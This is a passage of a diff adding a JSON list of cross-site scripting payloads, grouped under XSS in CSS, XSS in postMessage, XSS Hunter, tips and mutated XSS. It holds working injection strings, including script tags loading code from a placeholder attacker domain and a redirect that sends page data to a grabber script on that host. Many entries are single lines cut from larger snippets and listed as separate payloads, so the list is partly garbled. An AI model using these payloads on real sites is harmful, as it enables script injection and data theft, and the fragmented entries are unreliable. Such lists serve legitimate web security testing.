+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-140",
+    "title": "XSS in CSS",
+    "payload": "<!DOCTYPE html>",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-141",
+    "title": "XSS in CSS",
+    "payload": "<head>",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-142",
+    "title": "XSS in CSS",
+    "payload": "<style>",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-143",
+    "title": "XSS in CSS",
+    "payload": "div  {",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-144",
+    "title": "XSS in CSS",
+    "payload": "background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\");",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-145",
+    "title": "XSS in CSS",
+    "payload": "background-color: #cccccc;",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-146",
+    "title": "XSS in CSS",
+    "payload": "</style>",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-147",
+    "title": "XSS in CSS",
+    "payload": "</head>",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-148",
+    "title": "XSS in CSS",
+    "payload": "<div>lol</div>",
+    "context": "XSS in CSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-149",
+    "title": "XSS in PostMessage",
+    "payload": "<input type=button value=\"Click Me\" id=\"btn\">",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-150",
+    "title": "XSS in PostMessage",
+    "payload": "document.getElementById('btn').onclick = function(e){",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-151",
+    "title": "XSS in PostMessage",
+    "payload": "window.poc = window.open('http://10.10.10.10/#login');",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-152",
+    "title": "XSS in PostMessage",
+    "payload": "setTimeout(function(){",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-153",
+    "title": "XSS in PostMessage",
+    "payload": "window.poc.postMessage(",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-154",
+    "title": "XSS in PostMessage",
+    "payload": "\"sender\": \"accounts\",",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-155",
+    "title": "XSS in PostMessage",
+    "payload": "\"url\": \"javascript:confirm('XSS')\",",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-156",
+    "title": "XSS in PostMessage",
+    "payload": "},",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-157",
+    "title": "XSS in PostMessage",
+    "payload": "'*'",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-158",
+    "title": "XSS in PostMessage",
+    "payload": ");",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-159",
+    "title": "XSS in PostMessage",
+    "payload": "}, 2000);",
+    "context": "XSS in PostMessage",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-160",
+    "title": "XSS Hunter",
+    "payload": "\"><script src=\"https://js.rip/[ATTACKER.DOMAIN.TLD]\"></script>",
+    "context": "XSS Hunter",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-161",
+    "title": "XSS Hunter",
+    "payload": "\"><script src=//[ATTACKER.DOMAIN.TLD]></script>",
+    "context": "XSS Hunter",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-162",
+    "title": "XSS Hunter",
+    "payload": "<script>$.getScript(\"//[ATTACKER.DOMAIN.TLD]\")</script>",
+    "context": "XSS Hunter",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-163",
+    "title": "Tips",
+    "payload": "<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>",
+    "context": "Tips",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-164",
+    "title": "Tips",
+    "payload": "ruby -run -ehttpd . -p8080",
+    "context": "Tips",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-165",
+    "title": "Mutated XSS",
+    "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    "context": "Mutated XSS",
+    "tags": [
+      "xss"
+    ]
+  }
+]
